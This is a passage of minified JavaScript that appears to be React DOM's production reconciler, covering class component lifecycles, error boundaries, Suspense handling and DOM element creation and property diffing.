        typeof e.shouldComponentUpdate == "function"
            ? e.shouldComponentUpdate(r, s, i)
            : t.prototype && t.prototype.isPureReactComponent
              ? !ss(n, r) || !ss(o, s)
              : !0
    );
}
function Xm(e, t, n) {
    var r = !1,
        o = zn,
        s = t.contextType;
    return (
        typeof s == "object" && s !== null
            ? (s = at(s))
            : ((o = Ve(t) ? lr : _e.current), (r = t.contextTypes), (s = (r = r != null) ? io(e, o) : zn)),
        (t = new t(n, s)),
        (e.memoizedState = t.state !== null && t.state !== void 0 ? t.state : null),
        (t.updater = ua),
        (e.stateNode = t),
        (t._reactInternals = e),
        r &&
            ((e = e.stateNode),
            (e.__reactInternalMemoizedUnmaskedChildContext = o),
            (e.__reactInternalMemoizedMaskedChildContext = s)),
        t
    );
}
function Vd(e, t, n, r) {
    (e = t.state),
        typeof t.componentWillReceiveProps == "function" && t.componentWillReceiveProps(n, r),
        typeof t.UNSAFE_componentWillReceiveProps == "function" && t.UNSAFE_componentWillReceiveProps(n, r),
        t.state !== e && ua.enqueueReplaceState(t, t.state, null);
}
function Xl(e, t, n, r) {
    var o = e.stateNode;
    (o.props = n), (o.state = e.memoizedState), (o.refs = {}), su(e);
    var s = t.contextType;
    typeof s == "object" && s !== null ? (o.context = at(s)) : ((s = Ve(t) ? lr : _e.current), (o.context = io(e, s))),
        (o.state = e.memoizedState),
        (s = t.getDerivedStateFromProps),
        typeof s == "function" && (ql(e, t, s, n), (o.state = e.memoizedState)),
        typeof t.getDerivedStateFromProps == "function" ||
            typeof o.getSnapshotBeforeUpdate == "function" ||
            (typeof o.UNSAFE_componentWillMount != "function" && typeof o.componentWillMount != "function") ||
            ((t = o.state),
            typeof o.componentWillMount == "function" && o.componentWillMount(),
            typeof o.UNSAFE_componentWillMount == "function" && o.UNSAFE_componentWillMount(),
            t !== o.state && ua.enqueueReplaceState(o, o.state, null),
            Ii(e, n, o, r),
            (o.state = e.memoizedState)),
        typeof o.componentDidMount == "function" && (e.flags |= 4194308);
}
function uo(e, t) {
    try {
        var n = "",
            r = t;
        do (n += Xy(r)), (r = r.return);
        while (r);
        var o = n;
    } catch (s) {
        o =
            `
Error generating stack: ` +
            s.message +
            `
` +
            s.stack;
    }
    return { value: e, source: t, stack: o, digest: null };
}
function tl(e, t, n) {
    return { value: e, source: null, stack: n ?? null, digest: t ?? null };
}
function Yl(e, t) {
    try {
        console.error(t.value);
    } catch (n) {
        setTimeout(function () {
            throw n;
        });
    }
}
var k1 = typeof WeakMap == "function" ? WeakMap : Map;
function Ym(e, t, n) {
    (n = Yt(-1, n)), (n.tag = 3), (n.payload = { element: null });
    var r = t.value;
    return (
        (n.callback = function () {
            $i || (($i = !0), (ac = r)), Yl(e, t);
        }),
        n
    );
}
function Zm(e, t, n) {
    (n = Yt(-1, n)), (n.tag = 3);
    var r = e.type.getDerivedStateFromError;
    if (typeof r == "function") {
        var o = t.value;
        (n.payload = function () {
            return r(o);
        }),
            (n.callback = function () {
                Yl(e, t);
            });
    }
    var s = e.stateNode;
    return (
        s !== null &&
            typeof s.componentDidCatch == "function" &&
            (n.callback = function () {
                Yl(e, t), typeof r != "function" && (_n === null ? (_n = new Set([this])) : _n.add(this));
                var i = t.stack;
                this.componentDidCatch(t.value, { componentStack: i !== null ? i : "" });
            }),
        n
    );
}
function Wd(e, t, n) {
    var r = e.pingCache;
    if (r === null) {
        r = e.pingCache = new k1();
        var o = new Set();
        r.set(t, o);
    } else (o = r.get(t)), o === void 0 && ((o = new Set()), r.set(t, o));
    o.has(n) || (o.add(n), (e = D1.bind(null, e, t, n)), t.then(e, e));
}
function Kd(e) {
    do {
        var t;
        if (((t = e.tag === 13) && ((t = e.memoizedState), (t = t !== null ? t.dehydrated !== null : !0)), t)) return e;
        e = e.return;
    } while (e !== null);
    return null;
}
function Qd(e, t, n, r, o) {
    return e.mode & 1
        ? ((e.flags |= 65536), (e.lanes = o), e)
        : (e === t
              ? (e.flags |= 65536)
              : ((e.flags |= 128),
                (n.flags |= 131072),
                (n.flags &= -52805),
                n.tag === 1 && (n.alternate === null ? (n.tag = 17) : ((t = Yt(-1, 1)), (t.tag = 2), Mn(n, t, 1))),
                (n.lanes |= 1)),
          e);
}
var C1 = sn.ReactCurrentOwner,
    He = !1;
function Oe(e, t, n, r) {
    t.child = e === null ? Pm(t, null, n, r) : lo(t, e.child, n, r);
}
function Gd(e, t, n, r, o) {
    n = n.render;
    var s = t.ref;
    return (
        Kr(t, o),
        (r = uu(e, t, n, r, s, o)),
        (n = du()),
        e !== null && !He
            ? ((t.updateQueue = e.updateQueue), (t.flags &= -2053), (e.lanes &= ~o), nn(e, t, o))
            : (ce && n && Zc(t), (t.flags |= 1), Oe(e, t, r, o), t.child)
    );
}
function qd(e, t, n, r, o) {
    if (e === null) {
        var s = n.type;
        return typeof s == "function" &&
            !Su(s) &&
            s.defaultProps === void 0 &&
            n.compare === null &&
            n.defaultProps === void 0
            ? ((t.tag = 15), (t.type = s), Jm(e, t, s, r, o))
            : ((e = yi(n.type, null, r, t, t.mode, o)), (e.ref = t.ref), (e.return = t), (t.child = e));
    }
    if (((s = e.child), !(e.lanes & o))) {
        var i = s.memoizedProps;
        if (((n = n.compare), (n = n !== null ? n : ss), n(i, r) && e.ref === t.ref)) return nn(e, t, o);
    }
    return (t.flags |= 1), (e = On(s, r)), (e.ref = t.ref), (e.return = t), (t.child = e);
}
function Jm(e, t, n, r, o) {
    if (e !== null) {
        var s = e.memoizedProps;
        if (ss(s, r) && e.ref === t.ref)
            if (((He = !1), (t.pendingProps = r = s), (e.lanes & o) !== 0)) e.flags & 131072 && (He = !0);
            else return (t.lanes = e.lanes), nn(e, t, o);
    }
    return Zl(e, t, n, r, o);
}
function eh(e, t, n) {
    var r = t.pendingProps,
        o = r.children,
        s = e !== null ? e.memoizedState : null;
    if (r.mode === "hidden")
        if (!(t.mode & 1))
            (t.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }), oe(Ur, Qe), (Qe |= n);
        else {
            if (!(n & 1073741824))
                return (
                    (e = s !== null ? s.baseLanes | n : n),
                    (t.lanes = t.childLanes = 1073741824),
                    (t.memoizedState = { baseLanes: e, cachePool: null, transitions: null }),
                    (t.updateQueue = null),
                    oe(Ur, Qe),
                    (Qe |= e),
                    null
                );
            (t.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
                (r = s !== null ? s.baseLanes : n),
                oe(Ur, Qe),
                (Qe |= r);
        }
    else s !== null ? ((r = s.baseLanes | n), (t.memoizedState = null)) : (r = n), oe(Ur, Qe), (Qe |= r);
    return Oe(e, t, o, n), t.child;
}
function th(e, t) {
    var n = t.ref;
    ((e === null && n !== null) || (e !== null && e.ref !== n)) && ((t.flags |= 512), (t.flags |= 2097152));
}
function Zl(e, t, n, r, o) {
    var s = Ve(n) ? lr : _e.current;
    return (
        (s = io(t, s)),
        Kr(t, o),
        (n = uu(e, t, n, r, s, o)),
        (r = du()),
        e !== null && !He
            ? ((t.updateQueue = e.updateQueue), (t.flags &= -2053), (e.lanes &= ~o), nn(e, t, o))
            : (ce && r && Zc(t), (t.flags |= 1), Oe(e, t, n, o), t.child)
    );
}
function Xd(e, t, n, r, o) {
    if (Ve(n)) {
        var s = !0;
        Ai(t);
    } else s = !1;
    if ((Kr(t, o), t.stateNode === null)) mi(e, t), Xm(t, n, r), Xl(t, n, r, o), (r = !0);
    else if (e === null) {
        var i = t.stateNode,
            a = t.memoizedProps;
        i.props = a;
        var l = i.context,
            u = n.contextType;
        typeof u == "object" && u !== null ? (u = at(u)) : ((u = Ve(n) ? lr : _e.current), (u = io(t, u)));
        var d = n.getDerivedStateFromProps,
            p = typeof d == "function" || typeof i.getSnapshotBeforeUpdate == "function";
        p ||
            (typeof i.UNSAFE_componentWillReceiveProps != "function" &&
                typeof i.componentWillReceiveProps != "function") ||
            ((a !== r || l !== u) && Vd(t, i, r, u)),
            (yn = !1);
        var m = t.memoizedState;
        (i.state = m),
            Ii(t, r, i, o),
            (l = t.memoizedState),
            a !== r || m !== l || Be.current || yn
                ? (typeof d == "function" && (ql(t, n, d, r), (l = t.memoizedState)),
                  (a = yn || Bd(t, n, a, r, m, l, u))
                      ? (p ||
                            (typeof i.UNSAFE_componentWillMount != "function" &&
                                typeof i.componentWillMount != "function") ||
                            (typeof i.componentWillMount == "function" && i.componentWillMount(),
                            typeof i.UNSAFE_componentWillMount == "function" && i.UNSAFE_componentWillMount()),
                        typeof i.componentDidMount == "function" && (t.flags |= 4194308))
                      : (typeof i.componentDidMount == "function" && (t.flags |= 4194308),
                        (t.memoizedProps = r),
                        (t.memoizedState = l)),
                  (i.props = r),
                  (i.state = l),
                  (i.context = u),
                  (r = a))
                : (typeof i.componentDidMount == "function" && (t.flags |= 4194308), (r = !1));
    } else {
        (i = t.stateNode),
            jm(e, t),
            (a = t.memoizedProps),
            (u = t.type === t.elementType ? a : yt(t.type, a)),
            (i.props = u),
            (p = t.pendingProps),
            (m = i.context),
            (l = n.contextType),
            typeof l == "object" && l !== null ? (l = at(l)) : ((l = Ve(n) ? lr : _e.current), (l = io(t, l)));
        var f = n.getDerivedStateFromProps;
        (d = typeof f == "function" || typeof i.getSnapshotBeforeUpdate == "function") ||
            (typeof i.UNSAFE_componentWillReceiveProps != "function" &&
                typeof i.componentWillReceiveProps != "function") ||
            ((a !== p || m !== l) && Vd(t, i, r, l)),
            (yn = !1),
            (m = t.memoizedState),
            (i.state = m),
            Ii(t, r, i, o);
        var S = t.memoizedState;
        a !== p || m !== S || Be.current || yn
            ? (typeof f == "function" && (ql(t, n, f, r), (S = t.memoizedState)),
              (u = yn || Bd(t, n, u, r, m, S, l) || !1)
                  ? (d ||
                        (typeof i.UNSAFE_componentWillUpdate != "function" &&
                            typeof i.componentWillUpdate != "function") ||
                        (typeof i.componentWillUpdate == "function" && i.componentWillUpdate(r, S, l),
                        typeof i.UNSAFE_componentWillUpdate == "function" && i.UNSAFE_componentWillUpdate(r, S, l)),
                    typeof i.componentDidUpdate == "function" && (t.flags |= 4),
                    typeof i.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024))
                  : (typeof i.componentDidUpdate != "function" ||
                        (a === e.memoizedProps && m === e.memoizedState) ||
                        (t.flags |= 4),
                    typeof i.getSnapshotBeforeUpdate != "function" ||
                        (a === e.memoizedProps && m === e.memoizedState) ||
                        (t.flags |= 1024),
                    (t.memoizedProps = r),
                    (t.memoizedState = S)),
              (i.props = r),
              (i.state = S),
              (i.context = l),
              (r = u))
            : (typeof i.componentDidUpdate != "function" ||
                  (a === e.memoizedProps && m === e.memoizedState) ||
                  (t.flags |= 4),
              typeof i.getSnapshotBeforeUpdate != "function" ||
                  (a === e.memoizedProps && m === e.memoizedState) ||
                  (t.flags |= 1024),
              (r = !1));
    }
    return Jl(e, t, n, r, s, o);
}
function Jl(e, t, n, r, o, s) {
    th(e, t);
    var i = (t.flags & 128) !== 0;
    if (!r && !i) return o && Od(t, n, !1), nn(e, t, s);
    (r = t.stateNode), (C1.current = t);
    var a = i && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return (
        (t.flags |= 1),
        e !== null && i ? ((t.child = lo(t, e.child, null, s)), (t.child = lo(t, null, a, s))) : Oe(e, t, a, s),
        (t.memoizedState = r.state),
        o && Od(t, n, !0),
        t.child
    );
}
function nh(e) {
    var t = e.stateNode;
    t.pendingContext ? Ld(e, t.pendingContext, t.pendingContext !== t.context) : t.context && Ld(e, t.context, !1),
        iu(e, t.containerInfo);
}
function Yd(e, t, n, r, o) {
    return ao(), eu(o), (t.flags |= 256), Oe(e, t, n, r), t.child;
}
var ec = { dehydrated: null, treeContext: null, retryLane: 0 };
function tc(e) {
    return { baseLanes: e, cachePool: null, transitions: null };
}
function rh(e, t, n) {
    var r = t.pendingProps,
        o = ue.current,
        s = !1,
        i = (t.flags & 128) !== 0,
        a;
    if (
        ((a = i) || (a = e !== null && e.memoizedState === null ? !1 : (o & 2) !== 0),
        a ? ((s = !0), (t.flags &= -129)) : (e === null || e.memoizedState !== null) && (o |= 1),
        oe(ue, o & 1),
        e === null)
    )
        return (
            Ql(t),
            (e = t.memoizedState),
            e !== null && ((e = e.dehydrated), e !== null)
                ? (t.mode & 1 ? (e.data === "$!" ? (t.lanes = 8) : (t.lanes = 1073741824)) : (t.lanes = 1), null)
                : ((i = r.children),
                  (e = r.fallback),
                  s
                      ? ((r = t.mode),
                        (s = t.child),
                        (i = { mode: "hidden", children: i }),
                        !(r & 1) && s !== null ? ((s.childLanes = 0), (s.pendingProps = i)) : (s = fa(i, r, 0, null)),
                        (e = ar(e, r, n, null)),
                        (s.return = t),
                        (e.return = t),
                        (s.sibling = e),
                        (t.child = s),
                        (t.child.memoizedState = tc(n)),
                        (t.memoizedState = ec),
                        e)
                      : mu(t, i))
        );
    if (((o = e.memoizedState), o !== null && ((a = o.dehydrated), a !== null))) return E1(e, t, i, r, a, o, n);
    if (s) {
        (s = r.fallback), (i = t.mode), (o = e.child), (a = o.sibling);
        var l = { mode: "hidden", children: r.children };
        return (
            !(i & 1) && t.child !== o
                ? ((r = t.child), (r.childLanes = 0), (r.pendingProps = l), (t.deletions = null))
                : ((r = On(o, l)), (r.subtreeFlags = o.subtreeFlags & 14680064)),
            a !== null ? (s = On(a, s)) : ((s = ar(s, i, n, null)), (s.flags |= 2)),
            (s.return = t),
            (r.return = t),
            (r.sibling = s),
            (t.child = r),
            (r = s),
            (s = t.child),
            (i = e.child.memoizedState),
            (i = i === null ? tc(n) : { baseLanes: i.baseLanes | n, cachePool: null, transitions: i.transitions }),
            (s.memoizedState = i),
            (s.childLanes = e.childLanes & ~n),
            (t.memoizedState = ec),
            r
        );
    }
    return (
        (s = e.child),
        (e = s.sibling),
        (r = On(s, { mode: "visible", children: r.children })),
        !(t.mode & 1) && (r.lanes = n),
        (r.return = t),
        (r.sibling = null),
        e !== null && ((n = t.deletions), n === null ? ((t.deletions = [e]), (t.flags |= 16)) : n.push(e)),
        (t.child = r),
        (t.memoizedState = null),
        r
    );
}
function mu(e, t) {
    return (t = fa({ mode: "visible", children: t }, e.mode, 0, null)), (t.return = e), (e.child = t);
}
function Gs(e, t, n, r) {
    return (
        r !== null && eu(r),
        lo(t, e.child, null, n),
        (e = mu(t, t.pendingProps.children)),
        (e.flags |= 2),
        (t.memoizedState = null),
        e
    );
}
function E1(e, t, n, r, o, s, i) {
    if (n)
        return t.flags & 256
            ? ((t.flags &= -257), (r = tl(Error(R(422)))), Gs(e, t, i, r))
            : t.memoizedState !== null
              ? ((t.child = e.child), (t.flags |= 128), null)
              : ((s = r.fallback),
                (o = t.mode),
                (r = fa({ mode: "visible", children: r.children }, o, 0, null)),
                (s = ar(s, o, i, null)),
                (s.flags |= 2),
                (r.return = t),
                (s.return = t),
                (r.sibling = s),
                (t.child = r),
                t.mode & 1 && lo(t, e.child, null, i),
                (t.child.memoizedState = tc(i)),
                (t.memoizedState = ec),
                s);
    if (!(t.mode & 1)) return Gs(e, t, i, null);
    if (o.data === "$!") {
        if (((r = o.nextSibling && o.nextSibling.dataset), r)) var a = r.dgst;
        return (r = a), (s = Error(R(419))), (r = tl(s, r, void 0)), Gs(e, t, i, r);
    }
    if (((a = (i & e.childLanes) !== 0), He || a)) {
        if (((r = Ce), r !== null)) {
            switch (i & -i) {
                case 4:
                    o = 2;
                    break;
                case 16:
                    o = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    o = 32;
                    break;
                case 536870912:
                    o = 268435456;
                    break;
                default:
                    o = 0;
            }
            (o = o & (r.suspendedLanes | i) ? 0 : o),
                o !== 0 && o !== s.retryLane && ((s.retryLane = o), tn(e, o), Ct(r, e, o, -1));
        }
        return wu(), (r = tl(Error(R(421)))), Gs(e, t, i, r);
    }
    return o.data === "$?"
        ? ((t.flags |= 128), (t.child = e.child), (t = z1.bind(null, e)), (o._reactRetry = t), null)
        : ((e = s.treeContext),
          (qe = An(o.nextSibling)),
          (Xe = t),
          (ce = !0),
          (bt = null),
          e !== null && ((rt[ot++] = qt), (rt[ot++] = Xt), (rt[ot++] = cr), (qt = e.id), (Xt = e.overflow), (cr = t)),
          (t = mu(t, r.children)),
          (t.flags |= 4096),
          t);
}
function Zd(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), Gl(e.return, t, n);
}
function nl(e, t, n, r, o) {
    var s = e.memoizedState;
    s === null
        ? (e.memoizedState = { isBackwards: t, rendering: null, renderingStartTime: 0, last: r, tail: n, tailMode: o })
        : ((s.isBackwards = t),
          (s.rendering = null),
          (s.renderingStartTime = 0),
          (s.last = r),
          (s.tail = n),
          (s.tailMode = o));
}
function oh(e, t, n) {
    var r = t.pendingProps,
        o = r.revealOrder,
        s = r.tail;
    if ((Oe(e, t, r.children, n), (r = ue.current), r & 2)) (r = (r & 1) | 2), (t.flags |= 128);
    else {
        if (e !== null && e.flags & 128)
            e: for (e = t.child; e !== null; ) {
                if (e.tag === 13) e.memoizedState !== null && Zd(e, n, t);
                else if (e.tag === 19) Zd(e, n, t);
                else if (e.child !== null) {
                    (e.child.return = e), (e = e.child);
                    continue;
                }
                if (e === t) break e;
                for (; e.sibling === null; ) {
                    if (e.return === null || e.return === t) break e;
                    e = e.return;
                }
                (e.sibling.return = e.return), (e = e.sibling);
            }
        r &= 1;
    }
    if ((oe(ue, r), !(t.mode & 1))) t.memoizedState = null;
    else
        switch (o) {
            case "forwards":
                for (n = t.child, o = null; n !== null; )
                    (e = n.alternate), e !== null && Di(e) === null && (o = n), (n = n.sibling);
                (n = o),
                    n === null ? ((o = t.child), (t.child = null)) : ((o = n.sibling), (n.sibling = null)),
                    nl(t, !1, o, n, s);
                break;
            case "backwards":
                for (n = null, o = t.child, t.child = null; o !== null; ) {
                    if (((e = o.alternate), e !== null && Di(e) === null)) {
                        t.child = o;
                        break;
                    }
                    (e = o.sibling), (o.sibling = n), (n = o), (o = e);
                }
                nl(t, !0, n, null, s);
                break;
            case "together":
                nl(t, !1, null, null, void 0);
                break;
            default:
                t.memoizedState = null;
        }
    return t.child;
}
function mi(e, t) {
    !(t.mode & 1) && e !== null && ((e.alternate = null), (t.alternate = null), (t.flags |= 2));
}
function nn(e, t, n) {
    if ((e !== null && (t.dependencies = e.dependencies), (dr |= t.lanes), !(n & t.childLanes))) return null;
    if (e !== null && t.child !== e.child) throw Error(R(153));
    if (t.child !== null) {
        for (e = t.child, n = On(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null; )
            (e = e.sibling), (n = n.sibling = On(e, e.pendingProps)), (n.return = t);
        n.sibling = null;
    }
    return t.child;
}
function N1(e, t, n) {
    switch (t.tag) {
        case 3:
            nh(t), ao();
            break;
        case 5:
            Rm(t);
            break;
        case 1:
            Ve(t.type) && Ai(t);
            break;
        case 4:
            iu(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                o = t.memoizedProps.value;
            oe(Li, r._currentValue), (r._currentValue = o);
            break;
        case 13:
            if (((r = t.memoizedState), r !== null))
                return r.dehydrated !== null
                    ? (oe(ue, ue.current & 1), (t.flags |= 128), null)
                    : n & t.child.childLanes
                      ? rh(e, t, n)
                      : (oe(ue, ue.current & 1), (e = nn(e, t, n)), e !== null ? e.sibling : null);
            oe(ue, ue.current & 1);
            break;
        case 19:
            if (((r = (n & t.childLanes) !== 0), e.flags & 128)) {
                if (r) return oh(e, t, n);
                t.flags |= 128;
            }
            if (
                ((o = t.memoizedState),
                o !== null && ((o.rendering = null), (o.tail = null), (o.lastEffect = null)),
                oe(ue, ue.current),
                r)
            )
                break;
            return null;
        case 22:
        case 23:
            return (t.lanes = 0), eh(e, t, n);
    }
    return nn(e, t, n);
}
var sh, nc, ih, ah;
sh = function (e, t) {
    for (var n = t.child; n !== null; ) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            (n.child.return = n), (n = n.child);
            continue;
        }
        if (n === t) break;
        for (; n.sibling === null; ) {
            if (n.return === null || n.return === t) return;
            n = n.return;
        }
        (n.sibling.return = n.return), (n = n.sibling);
    }
};
nc = function () {};
ih = function (e, t, n, r) {
    var o = e.memoizedProps;
    if (o !== r) {
        (e = t.stateNode), Jn(zt.current);
        var s = null;
        switch (n) {
            case "input":
                (o = Cl(e, o)), (r = Cl(e, r)), (s = []);
                break;
            case "select":
                (o = pe({}, o, { value: void 0 })), (r = pe({}, r, { value: void 0 })), (s = []);
                break;
            case "textarea":
                (o = Pl(e, o)), (r = Pl(e, r)), (s = []);
                break;
            default:
                typeof o.onClick != "function" && typeof r.onClick == "function" && (e.onclick = ji);
        }
        jl(n, r);
        var i;
        n = null;
        for (u in o)
            if (!r.hasOwnProperty(u) && o.hasOwnProperty(u) && o[u] != null)
                if (u === "style") {
                    var a = o[u];
                    for (i in a) a.hasOwnProperty(i) && (n || (n = {}), (n[i] = ""));
                } else
                    u !== "dangerouslySetInnerHTML" &&
                        u !== "children" &&
                        u !== "suppressContentEditableWarning" &&
                        u !== "suppressHydrationWarning" &&
                        u !== "autoFocus" &&
                        (Zo.hasOwnProperty(u) ? s || (s = []) : (s = s || []).push(u, null));
        for (u in r) {
            var l = r[u];
            if (((a = o != null ? o[u] : void 0), r.hasOwnProperty(u) && l !== a && (l != null || a != null)))
                if (u === "style")
                    if (a) {
                        for (i in a) !a.hasOwnProperty(i) || (l && l.hasOwnProperty(i)) || (n || (n = {}), (n[i] = ""));
                        for (i in l) l.hasOwnProperty(i) && a[i] !== l[i] && (n || (n = {}), (n[i] = l[i]));
                    } else n || (s || (s = []), s.push(u, n)), (n = l);
                else
                    u === "dangerouslySetInnerHTML"
                        ? ((l = l ? l.__html : void 0),
                          (a = a ? a.__html : void 0),
                          l != null && a !== l && (s = s || []).push(u, l))
                        : u === "children"
                          ? (typeof l != "string" && typeof l != "number") || (s = s || []).push(u, "" + l)
                          : u !== "suppressContentEditableWarning" &&
                            u !== "suppressHydrationWarning" &&
                            (Zo.hasOwnProperty(u)
                                ? (l != null && u === "onScroll" && ie("scroll", e), s || a === l || (s = []))
                                : (s = s || []).push(u, l));
        }
        n && (s = s || []).push("style", n);
        var u = s;
        (t.updateQueue = u) && (t.flags |= 4);
    }
};
ah = function (e, t, n, r) {
    n !== r && (t.flags |= 4);
};
function Mo(e, t) {
    if (!ce)
        switch (e.tailMode) {
            case "hidden":
                t = e.tail;
                for (var n = null; t !== null; ) t.alternate !== null && (n = t), (t = t.sibling);
                n === null ? (e.tail = null) : (n.sibling = null);
                break;
            case "collapsed":
                n = e.tail;
                for (var r = null; n !== null; ) n.alternate !== null && (r = n), (n = n.sibling);
                r === null ? (t || e.tail === null ? (e.tail = null) : (e.tail.sibling = null)) : (r.sibling = null);
        }
}
function Re(e) {
    var t = e.alternate !== null && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t)
        for (var o = e.child; o !== null; )
            (n |= o.lanes | o.childLanes),
                (r |= o.subtreeFlags & 14680064),
                (r |= o.flags & 14680064),
                (o.return = e),
                (o = o.sibling);
    else
        for (o = e.child; o !== null; )
            (n |= o.lanes | o.childLanes), (r |= o.subtreeFlags), (r |= o.flags), (o.return = e), (o = o.sibling);
    return (e.subtreeFlags |= r), (e.childLanes = n), t;
}
function P1(e, t, n) {
    var r = t.pendingProps;
    switch ((Jc(t), t.tag)) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return Re(t), null;
        case 1:
            return Ve(t.type) && Ri(), Re(t), null;
        case 3:
            return (
                (r = t.stateNode),
                co(),
                ae(Be),
                ae(_e),
                lu(),
                r.pendingContext && ((r.context = r.pendingContext), (r.pendingContext = null)),
                (e === null || e.child === null) &&
                    (Ks(t)
                        ? (t.flags |= 4)
                        : e === null ||
                          (e.memoizedState.isDehydrated && !(t.flags & 256)) ||
                          ((t.flags |= 1024), bt !== null && (uc(bt), (bt = null)))),
                nc(e, t),
                Re(t),
                null
            );
        case 5:
            au(t);
            var o = Jn(us.current);
            if (((n = t.type), e !== null && t.stateNode != null))
                ih(e, t, n, r, o), e.ref !== t.ref && ((t.flags |= 512), (t.flags |= 2097152));
            else {
                if (!r) {
                    if (t.stateNode === null) throw Error(R(166));
                    return Re(t), null;
                }
                if (((e = Jn(zt.current)), Ks(t))) {
                    (r = t.stateNode), (n = t.type);
                    var s = t.memoizedProps;
                    switch (((r[Ot] = t), (r[ls] = s), (e = (t.mode & 1) !== 0), n)) {
                        case "dialog":
                            ie("cancel", r), ie("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            ie("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (o = 0; o < Uo.length; o++) ie(Uo[o], r);
                            break;
                        case "source":
                            ie("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            ie("error", r), ie("load", r);
                            break;
                        case "details":
                            ie("toggle", r);
                            break;
                        case "input":
                            ad(r, s), ie("invalid", r);
                            break;
                        case "select":
                            (r._wrapperState = { wasMultiple: !!s.multiple }), ie("invalid", r);
                            break;
                        case "textarea":
                            cd(r, s), ie("invalid", r);
                    }
                    jl(n, s), (o = null);
                    for (var i in s)
                        if (s.hasOwnProperty(i)) {
                            var a = s[i];
                            i === "children"
                                ? typeof a == "string"
                                    ? r.textContent !== a &&
                                      (s.suppressHydrationWarning !== !0 && Ws(r.textContent, a, e),
                                      (o = ["children", a]))
                                    : typeof a == "number" &&
                                      r.textContent !== "" + a &&
                                      (s.suppressHydrationWarning !== !0 && Ws(r.textContent, a, e),
                                      (o = ["children", "" + a]))
                                : Zo.hasOwnProperty(i) && a != null && i === "onScroll" && ie("scroll", r);
                        }
                    switch (n) {
                        case "input":
                            Ds(r), ld(r, s, !0);
                            break;
                        case "textarea":
                            Ds(r), ud(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof s.onClick == "function" && (r.onclick = ji);
                    }
                    (r = o), (t.updateQueue = r), r !== null && (t.flags |= 4);
                } else {
                    (i = o.nodeType === 9 ? o : o.ownerDocument),
                        e === "http://www.w3.org/1999/xhtml" && (e = Of(n)),
                        e === "http://www.w3.org/1999/xhtml"
                            ? n === "script"
                                ? ((e = i.createElement("div")),
                                  (e.innerHTML = "<script></script>"),
                                  (e = e.removeChild(e.firstChild)))
                                : typeof r.is == "string"
                                  ? (e = i.createElement(n, { is: r.is }))
                                  : ((e = i.createElement(n)),
                                    n === "select" &&
                                        ((i = e), r.multiple ? (i.multiple = !0) : r.size && (i.size = r.size)))
                            : (e = i.createElementNS(e, n)),
                        (e[Ot] = t),
                        (e[ls] = r),
                        sh(e, t, !1, !1),
                        (t.stateNode = e);
                    e: {
                        switch (((i = Rl(n, r)), n)) {
                            case "dialog":
                                ie("cancel", e), ie("close", e), (o = r);
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                ie("load", e), (o = r);
                                break;
                            case "video":
                            case "audio":
                                for (o = 0; o < Uo.length; o++) ie(Uo[o], e);
                                o = r;
                                break;
                            case "source":
                                ie("error", e), (o = r);
                                break;
                            case "img":
                            case "image":
                            case "link":
                                ie("error", e), ie("load", e), (o = r);
                                break;
                            case "details":
                                ie("toggle", e), (o = r);
                                break;
                            case "input":
                                ad(e, r), (o = Cl(e, r)), ie("invalid", e);
                                break;
                            case "option":
                                o = r;
                                break;
                            case "select":
                                (e._wrapperState = { wasMultiple: !!r.multiple }),
                                    (o = pe({}, r, { value: void 0 })),
                                    ie("invalid", e);
                                break;
                            case "textarea":
                                cd(e, r), (o = Pl(e, r)), ie("invalid", e);
                                break;
                            default:
                                o = r;
                        }
                        jl(n, o), (a = o);
                        for (s in a)
                            if (a.hasOwnProperty(s)) {
                                var l = a[s];
                                s === "style"
                                    ? zf(e, l)
                                    : s === "dangerouslySetInnerHTML"
                                      ? ((l = l ? l.__html : void 0), l != null && If(e, l))
                                      : s === "children"
                                        ? typeof l == "string"
                                            ? (n !== "textarea" || l !== "") && Jo(e, l)
                                            : typeof l == "number" && Jo(e, "" + l)
                                        : s !== "suppressContentEditableWarning" &&
                                          s !== "suppressHydrationWarning" &&
                                          s !== "autoFocus" &&
                                          (Zo.hasOwnProperty(s)
                                              ? l != null && s === "onScroll" && ie("scroll", e)
                                              : l != null && zc(e, s, l, i));
                            }
                        switch (n) {
                            case "input":
                                Ds(e), ld(e, r, !1);
                                break;
                            case "textarea":
                                Ds(e), ud(e);
                                break;
                            case "option":
                                r.value != null && e.setAttribute("value", "" + Dn(r.value));
                                break;
                            case "select":
                                (e.multiple = !!r.multiple),
                                    (s = r.value),
                                    s != null
                                        ? Hr(e, !!r.multiple, s, !1)
                                        : r.defaultValue != null && Hr(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof o.onClick == "function" && (e.onclick = ji);
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1;
                        }
                    }
                    r && (t.flags |= 4);
                }
                t.ref !== null && ((t.flags |= 512), (t.flags |= 2097152));
            }
            return Re(t), null;
        case 6:
            if (e && t.stateNode != null) ah(e, t, e.memoizedProps, r);
            else {
                if (typeof r != "string" && t.stateNode === null) throw Error(R(166));
                if (((n = Jn(us.current)), Jn(zt.current), Ks(t))) {
                    if (
                        ((r = t.stateNode),
                        (n = t.memoizedProps),
                        (r[Ot] = t),
